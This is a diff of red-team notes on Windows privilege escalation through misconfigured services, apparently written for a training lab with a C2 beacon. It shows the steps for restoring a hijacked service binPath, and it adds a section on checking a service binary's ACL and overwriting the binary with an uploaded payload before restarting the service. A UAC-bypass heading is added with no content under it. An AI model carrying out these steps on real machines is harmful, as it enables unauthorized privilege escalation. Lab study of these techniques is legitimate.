@@ -58,5 +58,14 @@ From beacon:
 9. ```connect localhost <port>```
 10. To restore the original path: ```run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"```
 
+## Weak Service Binary Permissions
+
+For when the weak permissions are on the service binary itself.
+
+PS: ```Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl```  If this shows Modify privileges over a binary, can overwrite it (make backup first) from beacon, e.g.: ```upload C:\Payloads\Service 3.exe```. If get an error, might need to stop the service (then restart it after replacing): ```run sc {stop|start} VulnService3```
+
+## UAC Bypasses
+
+
 
 
